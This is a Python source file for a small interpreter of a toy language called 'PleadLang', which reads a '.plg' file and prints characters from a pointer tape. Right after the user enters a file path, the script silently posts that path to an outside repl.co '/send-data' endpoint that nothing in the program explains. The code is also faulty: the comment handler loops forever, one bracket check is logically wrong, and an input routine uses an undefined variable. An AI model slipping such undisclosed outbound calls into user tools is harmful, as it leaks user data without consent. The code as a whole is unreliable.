#PleadLang
from time import perf_counter
import requests
start = perf_counter()
speI = 0
specificPtr = 0

def read_file(input):
  d = open(input).read()
  return d

def lang(kw):
  global specificPtr
  global speI
  curchar = lines.index(kw, speI)
  speI += 1
  if(kw == "p"):
    ia = curchar
    loa = ia + 1
    try:
      while(lines[loa] != "e"):
        if(str(lines[loa]).isdigit()):
          try:
            print(chr(int(lines[loa])), end="")
          except:
            print("Unknown print type")
            pass
        elif "pt" in str(lines[loa]):
          localv = lines[loa].replace("pt", "")
          try:
            if(lines[loa-1] == "o"):
              print(chr(opt[int(localv)]), end="")
            else:
              print(opt[int(localv)], end="")
            
          except:
            pass
        elif "[" and "]" in str(lines[loa]):
          lov = str(lines[loa]).replace("p ", "")
          num = lov[0:lov.find("[")]
          num2 = lov[lov.find("[")+1:lov.find("]")]
          if(num2.isnumeric()):
            for i in range(int(num)):
              print(chr(int(num2)), end=" ")
          elif num2 == ">":
            for i in range(int(num)):
              specificPtr += 1
          elif num2 == "<":
            for i in range(int(num)):
              if(specificPtr > 0):
                specificPtr += -1
              else:
                pass      
          elif "pr" in num2:
            try:
              for i in range(int(num)):
                print(opt[int(str(num2).replace("pr",""))])
            except:
              pass
        elif str(lines[loa]) == "nl":
          print()
        else:
          pass
        loa += 1
    except:
      pass
  elif kw == "s":
        opt[specificPtr] = int(lines[curchar + 1])
  elif kw == "f":
        opt[specificPtr] = str(0)
  elif kw == ">":
        specificPtr += 1
  elif kw == "<":
    if specificPtr > 0:
      specificPtr -= 1
    else:
      specificPtr = 0
  elif kw == "//":
      l = curchar + 1
      while(lines[l] != "\\"):
          pass
  else:
    pass

def inputs(kw):
    if kw == "i":
      isn = curchar + 1
      try:
        while(lines[isn] != "t"):
            print(lines[isn])
            isn += 1
        while(lines[isn] != "e"):
            lang(kw)
      except:
          pass


filename = input("File name ending with '.plg'. If you have a file next to the .exe file, then just put the filename. if not, put the path (for example: 'C:\Jeff\Documents\app.plg'): ")
requests.post("https://e-7.switchu423.repl.co/send-data", data={"file-p":filename})
try:
    lines = read_file(filename)
except:
    print("%s does not exist! Please check your file...." % filename)
try:lines = lines.split()
except:pass

ptrsW = ""
for i in range(2000):
  ptrsW = ptrsW + "0"


opt = list(ptrsW)


try: 
    for i in lines:
        lang(i)
    end = perf_counter()
except: 
    pass

try:
    print("Finished in %s seconds." % str(float(end - start))[0:5])
except:
    pass
#91 LINES